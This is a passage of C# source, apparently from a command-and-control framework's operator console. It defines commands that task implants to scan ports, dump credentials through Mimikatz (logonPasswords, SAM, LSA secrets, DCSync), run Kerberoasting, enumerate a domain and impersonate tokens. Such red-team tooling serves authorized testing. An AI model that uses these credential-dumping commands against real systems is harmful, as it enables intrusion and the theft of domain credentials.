                new MenuCommandParameter { Name = "Ports" },
                new MenuCommandParameter { Name = "Ping" }
            };
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            List<string> commands = Utilities.ParseParameters(UserInput);
            if (commands.Count() < 3 || commands.Count() > 4 || !commands[0].Equals(this.Name, StringComparison.OrdinalIgnoreCase))
            {
                EliteConsole.PrintFormattedErrorLine("Usage: PortScan <computer_names> <ports> [<ping>]");
                menuItem.PrintInvalidOptionError(UserInput);
                return;
            }
            TaskMenuItem task = (TaskMenuItem)((GruntInteractMenuItem)menuItem).MenuOptions.FirstOrDefault(O => O.MenuTitle == "Task");
            task.ValidateMenuParameters(new string[] { this.Name });
            task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set ComputerNames " + commands[1]);
            task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set Ports " + commands[2]);
            if (commands.Count() == 4)
            {
                if (!commands[3].Equals("true", StringComparison.OrdinalIgnoreCase) && !commands[3].Equals("false", StringComparison.OrdinalIgnoreCase))
                {
                    EliteConsole.PrintFormattedErrorLine("Ping must be either \"True\" or \"False\"");
                    EliteConsole.PrintFormattedErrorLine("Usage: PortScan <computer_names> <ports> [<ping>]");
                    menuItem.PrintInvalidOptionError(UserInput);
                    return;
                }
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set Ping " + commands[3]);
            }
            task.AdditionalOptions.FirstOrDefault(O => O.Name == "Start").Command(task, UserInput);
            task.LeavingMenuItem();
        }
    }

    public class MenuCommandGruntInteractMimikatz : MenuCommand
    {
        public MenuCommandGruntInteractMimikatz()
        {
            this.Name = "Mimikatz";
            this.Description = "Execute a Mimikatz command.";
            this.Parameters = new List<MenuCommandParameter> {
                new MenuCommandParameter { Name = "Command" }
            };
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            List<string> commands = Utilities.ParseParameters(UserInput);
            if (commands.Count() < 2 || !commands[0].Equals(this.Name, StringComparison.OrdinalIgnoreCase))
            {
                EliteConsole.PrintFormattedErrorLine("Must specify a Mimikatz command.");
                EliteConsole.PrintFormattedErrorLine("Usage: Mimikatz <command>");
                menuItem.PrintInvalidOptionError(UserInput);
                return;
            }
            TaskMenuItem task = (TaskMenuItem)((GruntInteractMenuItem)menuItem).MenuOptions.FirstOrDefault(O => O.MenuTitle == "Task");
            task.ValidateMenuParameters(new string[] { this.Name });
            task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set Command " + String.Join(" ", commands.GetRange(1, commands.Count() - 1)));
            task.AdditionalOptions.FirstOrDefault(O => O.Name == "Start").Command(task, UserInput);
            task.LeavingMenuItem();
        }
    }

    public class MenuCommandGruntInteractLogonPasswords : MenuCommand
    {
        public MenuCommandGruntInteractLogonPasswords()
        {
            this.Name = "LogonPasswords";
            this.Description = "Execute the Mimikatz command \"sekurlsa::logonPasswords\".";
            this.Parameters = new List<MenuCommandParameter>();
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            List<string> commands = Utilities.ParseParameters(UserInput);
            if (!commands.Any() || !commands[0].Equals(this.Name, StringComparison.OrdinalIgnoreCase))
            {
                EliteConsole.PrintFormattedErrorLine("Usage: LogonPasswords");
                menuItem.PrintInvalidOptionError(UserInput);
                return;
            }
            TaskMenuItem task = (TaskMenuItem)((GruntInteractMenuItem)menuItem).MenuOptions.FirstOrDefault(O => O.MenuTitle == "Task");
            task.ValidateMenuParameters(new string[] { "Mimikatz" });
            task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set Command privilege::debug sekurlsa::logonPasswords");
            task.AdditionalOptions.FirstOrDefault(O => O.Name == "Start").Command(task, UserInput);
            task.LeavingMenuItem();
        }
    }

    public class MenuCommandGruntInteractSamDump : MenuCommand
    {
        public MenuCommandGruntInteractSamDump()
        {
            this.Name = "SamDump";
            this.Description = "Execute the Mimikatz command: \"token::elevate lsadump::sam\".";
            this.Parameters = new List<MenuCommandParameter>();
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            List<string> commands = Utilities.ParseParameters(UserInput);
            if (!commands.Any() || !commands[0].Equals(this.Name, StringComparison.OrdinalIgnoreCase))
            {
                EliteConsole.PrintFormattedErrorLine("Usage: SamDump");
                menuItem.PrintInvalidOptionError(UserInput);
                return;
            }
            TaskMenuItem task = (TaskMenuItem)((GruntInteractMenuItem)menuItem).MenuOptions.FirstOrDefault(O => O.MenuTitle == "Task");
            task.ValidateMenuParameters(new string[] { "Mimikatz" });
            task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set Command token::elevate lsadump::sam");
            task.AdditionalOptions.FirstOrDefault(O => O.Name == "Start").Command(task, UserInput);
            task.LeavingMenuItem();
        }
    }

    public class MenuCommandGruntInteractLsaSecrets : MenuCommand
    {
        public MenuCommandGruntInteractLsaSecrets()
        {
            this.Name = "LsaSecrets";
            this.Description = "Execute the Mimikatz command \"token::elevate lsadump::secrets\".";
            this.Parameters = new List<MenuCommandParameter>();
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            List<string> commands = Utilities.ParseParameters(UserInput);
            if (!commands.Any() || !commands[0].Equals(this.Name, StringComparison.OrdinalIgnoreCase))
            {
                EliteConsole.PrintFormattedErrorLine("Usage: LsaSecrets");
                menuItem.PrintInvalidOptionError(UserInput);
                return;
            }
            TaskMenuItem task = (TaskMenuItem)((GruntInteractMenuItem)menuItem).MenuOptions.FirstOrDefault(O => O.MenuTitle == "Task");
            task.ValidateMenuParameters(new string[] { "Mimikatz" });
            task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set Command token::elevate lsadump::secrets");
            task.AdditionalOptions.FirstOrDefault(O => O.Name == "Start").Command(task, UserInput);
            task.LeavingMenuItem();
        }
    }

    public class MenuCommandGruntInteractDCSync : MenuCommand
    {
        public MenuCommandGruntInteractDCSync()
        {
            this.Name = "DCSync";
            this.Description = "Execute the Mimikatz command \"lsadump::dcsync\".";
            this.Parameters = new List<MenuCommandParameter> {
                new MenuCommandParameter { Name = "User" },
                new MenuCommandParameter { Name = "FQDN" },
                new MenuCommandParameter { Name = "DC" }
            };
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            List<string> commands = Utilities.ParseParameters(UserInput);
            if (commands.Count() < 2 || commands.Count() > 4 || !commands[0].Equals(this.Name, StringComparison.OrdinalIgnoreCase))
            {
                EliteConsole.PrintFormattedErrorLine("Usage: DCSync <user> [<fqdn>] [<dc>]");
                menuItem.PrintInvalidOptionError(UserInput);
                return;
            }
            TaskMenuItem task = (TaskMenuItem)((GruntInteractMenuItem)menuItem).MenuOptions.FirstOrDefault(O => O.MenuTitle == "Task");
            task.ValidateMenuParameters(new string[] { "Mimikatz" });

            string command = "\"lsadump::dcsync";
            if (commands[1].Equals("all", StringComparison.OrdinalIgnoreCase))
            {
                command += " /all";
            }
            else
            {
                command += " /user:" + commands[1];
            }
            if (commands.Count() > 2)
            {
                command += " /domain:" + commands[2];
            }
            if (commands.Count() > 3)
            {
                command += " /dc:" + commands[3];
            }
            command += "\"";
            task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set Command " + command);
            task.AdditionalOptions.FirstOrDefault(O => O.Name == "Start").Command(task, UserInput);
            task.LeavingMenuItem();
        }
    }

    public class MenuCommandGruntInteractRubeus : MenuCommand
    {
        public MenuCommandGruntInteractRubeus()
        {
            this.Name = "Rubeus";
            this.Description = "Use a Rubeus command.";
            this.Parameters = new List<MenuCommandParameter> {
                new MenuCommandParameter { Name = "Command" }
            };
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            List<string> commands = Utilities.ParseParameters(UserInput);
            if (commands.Count() < 2 || !commands[0].Equals(this.Name, StringComparison.OrdinalIgnoreCase))
            {
                EliteConsole.PrintFormattedErrorLine("Must specify a Rubeus command.");
                EliteConsole.PrintFormattedErrorLine("Usage: Rubeus <command>");
                menuItem.PrintInvalidOptionError(UserInput);
                return;
            }
            TaskMenuItem task = (TaskMenuItem)((GruntInteractMenuItem)menuItem).MenuOptions.FirstOrDefault(O => O.MenuTitle == "Task");
            task.ValidateMenuParameters(new string[] { this.Name });
            task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set Command " + String.Join(" ", commands.GetRange(1, commands.Count() - 1)));
            task.AdditionalOptions.FirstOrDefault(O => O.Name == "Start").Command(task, UserInput);
            task.LeavingMenuItem();
        }
    }

    public class MenuCommandGruntInteractSharpDPAPI : MenuCommand
    {
        public MenuCommandGruntInteractSharpDPAPI()
        {
            this.Name = "SharpDPAPI";
            this.Description = "Use a SharpDPAPI command.";
            this.Parameters = new List<MenuCommandParameter> {
                new MenuCommandParameter { Name = "Command" }
            };
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            List<string> commands = Utilities.ParseParameters(UserInput);
            if (commands.Count() < 2 || !commands[0].Equals(this.Name, StringComparison.OrdinalIgnoreCase))
            {
                EliteConsole.PrintFormattedErrorLine("Must specify a SharpDPAPI command.");
                EliteConsole.PrintFormattedErrorLine("Usage: SharpDPAPI <command>");
                menuItem.PrintInvalidOptionError(UserInput);
                return;
            }
            TaskMenuItem task = (TaskMenuItem)((GruntInteractMenuItem)menuItem).MenuOptions.FirstOrDefault(O => O.MenuTitle == "Task");
            task.ValidateMenuParameters(new string[] { this.Name });
            task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set Command " + String.Join(" ", commands.GetRange(1, commands.Count() - 1)));
            task.AdditionalOptions.FirstOrDefault(O => O.Name == "Start").Command(task, UserInput);
            task.LeavingMenuItem();
        }
    }

    public class MenuCommandGruntInteractSharpUp : MenuCommand
    {
        public MenuCommandGruntInteractSharpUp()
        {
            this.Name = "SharpUp";
            this.Description = "Use a SharpUp command.";
            this.Parameters = new List<MenuCommandParameter> {
                new MenuCommandParameter { Name = "Command" }
            };
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            List<string> commands = Utilities.ParseParameters(UserInput);
            if (commands.Count() < 2 || !commands[0].Equals(this.Name, StringComparison.OrdinalIgnoreCase))
            {
                EliteConsole.PrintFormattedErrorLine("Must specify a SharpUp command.");
                EliteConsole.PrintFormattedErrorLine("Usage: SharpUp <command>");
                menuItem.PrintInvalidOptionError(UserInput);
                return;
            }
            TaskMenuItem task = (TaskMenuItem)((GruntInteractMenuItem)menuItem).MenuOptions.FirstOrDefault(O => O.MenuTitle == "Task");
            task.ValidateMenuParameters(new string[] { this.Name });
            task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set Command " + String.Join(" ", commands.GetRange(1, commands.Count() - 1)));
            task.AdditionalOptions.FirstOrDefault(O => O.Name == "Start").Command(task, UserInput);
            task.LeavingMenuItem();
        }
    }

    public class MenuCommandGruntInteractSafetyKatz : MenuCommand
    {
        public MenuCommandGruntInteractSafetyKatz()
        {
            this.Name = "SafetyKatz";
            this.Description = "Use SafetyKatz.";
            this.Parameters = new List<MenuCommandParameter>();
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            List<string> commands = Utilities.ParseParameters(UserInput);
            if (commands.Count() != 1 || !commands[0].Equals(this.Name, StringComparison.OrdinalIgnoreCase))
            {
                EliteConsole.PrintFormattedErrorLine("Usage: SafetyKatz");
                menuItem.PrintInvalidOptionError(UserInput);
                return;
            }
            TaskMenuItem task = (TaskMenuItem)((GruntInteractMenuItem)menuItem).MenuOptions.FirstOrDefault(O => O.MenuTitle == "Task");
            task.ValidateMenuParameters(new string[] { this.Name });
            task.AdditionalOptions.FirstOrDefault(O => O.Name == "Start").Command(task, UserInput);
            task.LeavingMenuItem();
        }
    }

    public class MenuCommandGruntInteractSharpDump : MenuCommand
    {
        public MenuCommandGruntInteractSharpDump()
        {
            this.Name = "SharpDump";
            this.Description = "Use a SharpDump command.";
            this.Parameters = new List<MenuCommandParameter> {
                new MenuCommandParameter { Name = "ProcessID" }
            };
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            List<string> commands = Utilities.ParseParameters(UserInput);
            if (commands.Count() != 2 || !commands[0].Equals(this.Name, StringComparison.OrdinalIgnoreCase))
            {
                EliteConsole.PrintFormattedErrorLine("Must specify a ProcessID.");
                EliteConsole.PrintFormattedErrorLine("Usage: SharpDump <process_id>");
                menuItem.PrintInvalidOptionError(UserInput);
                return;
            }
            TaskMenuItem task = (TaskMenuItem)((GruntInteractMenuItem)menuItem).MenuOptions.FirstOrDefault(O => O.MenuTitle == "Task");
            task.ValidateMenuParameters(new string[] { this.Name });
            task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set Command " + commands[1]);
            task.AdditionalOptions.FirstOrDefault(O => O.Name == "Start").Command(task, UserInput);
            task.LeavingMenuItem();
        }
    }

    public class MenuCommandGruntInteractSharpWMI : MenuCommand
    {
        public MenuCommandGruntInteractSharpWMI()
        {
            this.Name = "SharpWMI";
            this.Description = "Use a SharpWMI command.";
            this.Parameters = new List<MenuCommandParameter> {
                new MenuCommandParameter { Name = "Command" }
            };
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            List<string> commands = Utilities.ParseParameters(UserInput);
            if (commands.Count() < 2 || !commands[0].Equals(this.Name, StringComparison.OrdinalIgnoreCase))
            {
                EliteConsole.PrintFormattedErrorLine("Must specify a SharpWMI command.");
                EliteConsole.PrintFormattedErrorLine("Usage: SharpWMI <command>");
                menuItem.PrintInvalidOptionError(UserInput);
                return;
            }
            TaskMenuItem task = (TaskMenuItem)((GruntInteractMenuItem)menuItem).MenuOptions.FirstOrDefault(O => O.MenuTitle == "Task");
            task.ValidateMenuParameters(new string[] { this.Name });
            task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set Command " + String.Join(" ", commands.GetRange(1, commands.Count() - 1)));
            task.AdditionalOptions.FirstOrDefault(O => O.Name == "Start").Command(task, UserInput);
            task.LeavingMenuItem();
        }
    }

    public class MenuCommandGruntInteractSeatbelt : MenuCommand
    {
        public MenuCommandGruntInteractSeatbelt()
        {
            this.Name = "Seatbelt";
            this.Description = "Use a Seatbelt command.";
            this.Parameters = new List<MenuCommandParameter> {
                new MenuCommandParameter { Name = "Command" }
            };
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            List<string> commands = Utilities.ParseParameters(UserInput);
            if (commands.Count() < 2 || !commands[0].Equals(this.Name, StringComparison.OrdinalIgnoreCase))
            {
                EliteConsole.PrintFormattedErrorLine("Must specify a Seatbelt command.");
                EliteConsole.PrintFormattedErrorLine("Usage: Seatbelt <command>");
                menuItem.PrintInvalidOptionError(UserInput);
                return;
            }
            TaskMenuItem task = (TaskMenuItem)((GruntInteractMenuItem)menuItem).MenuOptions.FirstOrDefault(O => O.MenuTitle == "Task");
            task.ValidateMenuParameters(new string[] { this.Name });
            task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set Command " + String.Join(" ", commands.GetRange(1, commands.Count() - 1)));
            task.AdditionalOptions.FirstOrDefault(O => O.Name == "Start").Command(task, UserInput);
            task.LeavingMenuItem();
        }
    }

    public class MenuCommandGruntInteractKerberoast : MenuCommand
    {
        public MenuCommandGruntInteractKerberoast()
        {
            this.Name = "Kerberoast";
            this.Description = "Perform a \"kerberoasting\" attack to retreive crackable SPN tickets.";
            this.Parameters = new List<MenuCommandParameter> {
                new MenuCommandParameter { Name = "Usernames" },
                new MenuCommandParameter { Name = "Hash Format" }
            };
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            List<string> commands = Utilities.ParseParameters(UserInput);
            if (!commands.Any() || commands.Count() > 3 || !commands[0].Equals(this.Name, StringComparison.OrdinalIgnoreCase))
            {
                EliteConsole.PrintFormattedErrorLine("Usage: Kerberoast <usernames> <hash_format>");
                menuItem.PrintInvalidOptionError(UserInput);
                return;
            }
            string usernames = "";
            string format = "Hashcat";
            if (commands.Count() > 1)
            {
                if (commands.Count() == 2)
                {
                    if (commands[1].Equals("hashcat", StringComparison.OrdinalIgnoreCase) || commands[1].Equals("john", StringComparison.OrdinalIgnoreCase))
                    {
                        format = commands[1];
                    }
                    else
                    {
                        usernames = commands[1];
                    }
                }
                else if (commands.Count() == 3)
                {
                    if (!commands[2].Equals("hashcat", StringComparison.OrdinalIgnoreCase) && !commands[2].Equals("john", StringComparison.OrdinalIgnoreCase))
                    {
                        EliteConsole.PrintFormattedErrorLine("Hash Format must be either \"Hashcat\" or \"John\"");
                        EliteConsole.PrintFormattedErrorLine("Usage: Kerberoast <usernames> <hash_format>");
                        menuItem.PrintInvalidOptionError(UserInput);
                        return;
                    }
                    usernames = commands[1];
                    format = commands[2];
                }
            }
            TaskMenuItem task = (TaskMenuItem)((GruntInteractMenuItem)menuItem).MenuOptions.FirstOrDefault(O => O.MenuTitle == "Task");
            task.ValidateMenuParameters(new string[] { this.Name });
            task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set Usernames " + usernames);
            task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set HashFormat " + format);
            task.AdditionalOptions.FirstOrDefault(O => O.Name == "Start").Command(task, UserInput);
            task.LeavingMenuItem();
        }
    }

    public class MenuCommandGruntInteractGetDomainUser : MenuCommand
    {
        public MenuCommandGruntInteractGetDomainUser()
        {
            this.Name = "GetDomainUser";
            this.Description = "Gets a list of specified (or all) user `DomainObject`s in the current Domain.";
            this.Parameters = new List<MenuCommandParameter> {
                new MenuCommandParameter { Name = "Identities" }
            };
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            List<string> commands = Utilities.ParseParameters(UserInput);
            if (commands.Count() > 2 || !commands[0].Equals(this.Name, StringComparison.OrdinalIgnoreCase))
            {
                EliteConsole.PrintFormattedErrorLine("Usage: GetDomainUser <identities>");
                menuItem.PrintInvalidOptionError(UserInput);
                return;
            }
            TaskMenuItem task = (TaskMenuItem)((GruntInteractMenuItem)menuItem).MenuOptions.FirstOrDefault(O => O.MenuTitle == "Task");
            task.ValidateMenuParameters(new string[] { this.Name });
            if (commands.Count == 2)
            {
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set Identities " + commands[1]);
            }
            else
            {
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Unset").Command(task, "Unset Identities");
            }
            task.AdditionalOptions.FirstOrDefault(O => O.Name == "Start").Command(task, UserInput);
            task.LeavingMenuItem();
        }
    }

    public class MenuCommandGruntInteractGetDomainGroup : MenuCommand
    {
        public MenuCommandGruntInteractGetDomainGroup()
        {
            this.Name = "GetDomainGroup";
            this.Description = "Gets a list of specified (or all) group `DomainObject`s in the current Domain.";
            this.Parameters = new List<MenuCommandParameter> {
                new MenuCommandParameter { Name = "Identities" }
            };
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            List<string> commands = Utilities.ParseParameters(UserInput);
            if (commands.Count() > 2 || !commands[0].Equals(this.Name, StringComparison.OrdinalIgnoreCase))
            {
                EliteConsole.PrintFormattedErrorLine("Usage: GetDomainGroup <identities>");
                menuItem.PrintInvalidOptionError(UserInput);
                return;
            }
            TaskMenuItem task = (TaskMenuItem)((GruntInteractMenuItem)menuItem).MenuOptions.FirstOrDefault(O => O.MenuTitle == "Task");
            task.ValidateMenuParameters(new string[] { this.Name });
            if (commands.Count == 2)
            {
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set Identities " + commands[1]);
            }
            else
            {
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Unset").Command(task, "Unset Identities");
            }
            task.AdditionalOptions.FirstOrDefault(O => O.Name == "Start").Command(task, UserInput);
            task.LeavingMenuItem();
        }
    }

    public class MenuCommandGruntInteractGetDomainComputer : MenuCommand
    {
        public MenuCommandGruntInteractGetDomainComputer()
        {
            this.Name = "GetDomainComputer";
            this.Description = "Gets a list of specified (or all) computer `DomainObject`s in the current Domain.";
            this.Parameters = new List<MenuCommandParameter> {
                new MenuCommandParameter { Name = "Identities" }
            };
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            List<string> commands = Utilities.ParseParameters(UserInput);
            if (commands.Count() > 2 || !commands[0].Equals(this.Name, StringComparison.OrdinalIgnoreCase))
            {
                EliteConsole.PrintFormattedErrorLine("Usage: GetDomainComputer <identities>");
                menuItem.PrintInvalidOptionError(UserInput);
                return;
            }
            TaskMenuItem task = (TaskMenuItem)((GruntInteractMenuItem)menuItem).MenuOptions.FirstOrDefault(O => O.MenuTitle == "Task");
            task.ValidateMenuParameters(new string[] { this.Name });
            if (commands.Count == 2)
            {
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set Identities " + commands[1]);
            }
            else
            {
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Unset").Command(task, "Unset Identities");
            }
            task.AdditionalOptions.FirstOrDefault(O => O.Name == "Start").Command(task, UserInput);
            task.LeavingMenuItem();
        }
    }

    public class MenuCommandGruntInteractGetNetLocalGroup : MenuCommand
    {
        public MenuCommandGruntInteractGetNetLocalGroup()
        {
            this.Name = "GetNetLocalGroup";
            this.Description = "Gets a list of `LocalGroup`s from specified remote computer(s).";
            this.Parameters = new List<MenuCommandParameter> {
                new MenuCommandParameter { Name = "ComputerNames" }
            };
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            List<string> commands = Utilities.ParseParameters(UserInput);
            if (commands.Count() != 2 || !commands[0].Equals(this.Name, StringComparison.OrdinalIgnoreCase))
            {
                EliteConsole.PrintFormattedErrorLine("Usage: GetNetLocalGroup <computernames>");
                menuItem.PrintInvalidOptionError(UserInput);
                return;
            }
            TaskMenuItem task = (TaskMenuItem)((GruntInteractMenuItem)menuItem).MenuOptions.FirstOrDefault(O => O.MenuTitle == "Task");
            task.ValidateMenuParameters(new string[] { this.Name });
            task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set ComputerNames " + commands[1]);
            task.AdditionalOptions.FirstOrDefault(O => O.Name == "Start").Command(task, UserInput);
            task.LeavingMenuItem();
        }
    }

    public class MenuCommandGruntInteractGetNetLocalGroupMember : MenuCommand
    {
        public MenuCommandGruntInteractGetNetLocalGroupMember()
        {
            this.Name = "GetNetLocalGroupMember";
            this.Description = "Gets a list of `LocalGroupMember`s from specified remote computer(s).";
            this.Parameters = new List<MenuCommandParameter> {
                new MenuCommandParameter { Name = "ComputerNames" },
                new MenuCommandParameter { Name = "LocalGroup" }
            };
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            List<string> commands = Utilities.ParseParameters(UserInput);
            if (commands.Count() != 3 || !commands[0].Equals(this.Name, StringComparison.OrdinalIgnoreCase))
            {
                EliteConsole.PrintFormattedErrorLine("Usage: GetNetLocalGroupMember <computernames> <localgroup>");
                menuItem.PrintInvalidOptionError(UserInput);
                return;
            }
            TaskMenuItem task = (TaskMenuItem)((GruntInteractMenuItem)menuItem).MenuOptions.FirstOrDefault(O => O.MenuTitle == "Task");
            task.ValidateMenuParameters(new string[] { this.Name });
            task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set ComputerNames " + commands[1]);
            task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set LocalGroup " + commands[2]);
            task.AdditionalOptions.FirstOrDefault(O => O.Name == "Start").Command(task, UserInput);
            task.LeavingMenuItem();
        }
    }

    public class MenuCommandGruntInteractGetNetLoggedOnUser : MenuCommand
    {
        public MenuCommandGruntInteractGetNetLoggedOnUser()
        {
            this.Name = "GetNetLoggedOnUser";
            this.Description = "Gets a list of `LoggedOnUser`s from specified remote computer(s).";
            this.Parameters = new List<MenuCommandParameter> {
                new MenuCommandParameter { Name = "ComputerNames" }
            };
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            List<string> commands = Utilities.ParseParameters(UserInput);
            if (commands.Count() != 2 || !commands[0].Equals(this.Name, StringComparison.OrdinalIgnoreCase))
            {
                EliteConsole.PrintFormattedErrorLine("Usage: GetNetLoggedOnUser <computernames>");
                menuItem.PrintInvalidOptionError(UserInput);
                return;
            }
            TaskMenuItem task = (TaskMenuItem)((GruntInteractMenuItem)menuItem).MenuOptions.FirstOrDefault(O => O.MenuTitle == "Task");
            task.ValidateMenuParameters(new string[] { this.Name });
            task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set ComputerNames " + commands[1]);
            task.AdditionalOptions.FirstOrDefault(O => O.Name == "Start").Command(task, UserInput);
            task.LeavingMenuItem();
        }
    }

    public class MenuCommandGruntInteractGetNetSession : MenuCommand
    {
        public MenuCommandGruntInteractGetNetSession()
        {
            this.Name = "GetNetSession";
            this.Description = "Gets a list of `SessionInfo`s from specified remote computer(s).";
            this.Parameters = new List<MenuCommandParameter> {
                new MenuCommandParameter { Name = "ComputerNames" }
            };
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            List<string> commands = Utilities.ParseParameters(UserInput);
            if (commands.Count() != 2 || !commands[0].Equals(this.Name, StringComparison.OrdinalIgnoreCase))
            {
                EliteConsole.PrintFormattedErrorLine("Usage: GetNetSession <computernames>");
                menuItem.PrintInvalidOptionError(UserInput);
                return;
            }
            TaskMenuItem task = (TaskMenuItem)((GruntInteractMenuItem)menuItem).MenuOptions.FirstOrDefault(O => O.MenuTitle == "Task");
            task.ValidateMenuParameters(new string[] { this.Name });
            task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set ComputerNames " + commands[1]);
            task.AdditionalOptions.FirstOrDefault(O => O.Name == "Start").Command(task, UserInput);
            task.LeavingMenuItem();
        }
    }

    public class MenuCommandGruntInteractImpersonateUser : MenuCommand
    {
        public MenuCommandGruntInteractImpersonateUser()
        {
            this.Name = "ImpersonateUser";
            this.Description = "Find a process owned by the specified user and impersonate the token. Used to execute subsequent commands as the specified user.";
            this.Parameters = new List<MenuCommandParameter> {
                new MenuCommandParameter { Name = "Username" }
            };
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            List<string> commands = Utilities.ParseParameters(UserInput);
            if (commands.Count() != 2 || !commands[0].Equals(this.Name, StringComparison.OrdinalIgnoreCase))
            {
                EliteConsole.PrintFormattedErrorLine("Usage: ImpersonateUser <username>");
                menuItem.PrintInvalidOptionError(UserInput);
                return;
            }
            TaskMenuItem task = (TaskMenuItem)((GruntInteractMenuItem)menuItem).MenuOptions.FirstOrDefault(O => O.MenuTitle == "Task");
            task.ValidateMenuParameters(new string[] { this.Name });
            task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set Username " + commands[1]);
            task.AdditionalOptions.FirstOrDefault(O => O.Name == "Start").Command(task, UserInput);
            task.LeavingMenuItem();
        }
    }

    public class MenuCommandGruntInteractImpersonateProcess : MenuCommand
    {
        public MenuCommandGruntInteractImpersonateProcess()
        {
            this.Name = "ImpersonateProcess";
            this.Description = "Impersonate the token of the specified process. Used to execute subsequent commands as the user associated with the token of the specified process.";
            this.Parameters = new List<MenuCommandParameter> {
                new MenuCommandParameter { Name = "ProcessID" }
            };
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            List<string> commands = Utilities.ParseParameters(UserInput);
            if (commands.Count() != 2 || !commands[0].Equals(this.Name, StringComparison.OrdinalIgnoreCase))
            {
                EliteConsole.PrintFormattedErrorLine("Usage: ImpersonateProcess <processid>");
                menuItem.PrintInvalidOptionError(UserInput);
                return;
            }
            TaskMenuItem task = (TaskMenuItem)((GruntInteractMenuItem)menuItem).MenuOptions.FirstOrDefault(O => O.MenuTitle == "Task");
            task.ValidateMenuParameters(new string[] { this.Name });
            task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set ProcessID " + commands[1]);
            task.AdditionalOptions.FirstOrDefault(O => O.Name == "Start").Command(task, UserInput);
            task.LeavingMenuItem();
        }
    }

    public class MenuCommandGruntInteractGetSystem : MenuCommand
    {
        public MenuCommandGruntInteractGetSystem()
        {
            this.Name = "GetSystem";
            this.Description = "Impersonate the SYSTEM user. Equates to ImpersonateUser(\"NT AUTHORITY\\SYSTEM\").";
            this.Parameters = new List<MenuCommandParameter>();
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            List<string> commands = Utilities.ParseParameters(UserInput);
            if (commands.Count() != 1 || !commands[0].Equals(this.Name, StringComparison.OrdinalIgnoreCase))
            {
                EliteConsole.PrintFormattedErrorLine("Usage: GetSystem");
                menuItem.PrintInvalidOptionError(UserInput);
                return;
            }
            TaskMenuItem task = (TaskMenuItem)((GruntInteractMenuItem)menuItem).MenuOptions.FirstOrDefault(O => O.MenuTitle == "Task");
            task.ValidateMenuParameters(new string[] { this.Name });
            task.AdditionalOptions.FirstOrDefault(O => O.Name == "Start").Command(task, UserInput);
            task.LeavingMenuItem();
        }
    }

    public class MenuCommandGruntInteractMakeToken : MenuCommand
    {
        public MenuCommandGruntInteractMakeToken()
        {
            this.Name = "MakeToken";
            this.Description = "Makes a new token with a specified username and password, and impersonates it to conduct future actions as the specified user.";
            this.Parameters = new List<MenuCommandParameter> {
                new MenuCommandParameter { Name = "Username" },
                new MenuCommandParameter { Name = "Domain" },
                new MenuCommandParameter { Name = "Password" },
                new MenuCommandParameter { Name = "LogonType" }
            };
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            List<string> commands = Utilities.ParseParameters(UserInput);
            if (commands.Count() < 4 || commands.Count() > 5 || !commands[0].Equals(this.Name, StringComparison.OrdinalIgnoreCase))
            {
                EliteConsole.PrintFormattedErrorLine("Usage: MakeToken <username> <domain> <password> <logontype>");
                menuItem.PrintInvalidOptionError(UserInput);
                return;
            }
            string username = "username";
            string domain = "domain";
            string password = "password";
            string logontype = "LOGON32_LOGON_NEW_CREDENTIALS";
            if (commands.Count() > 1) { username = commands[1]; }
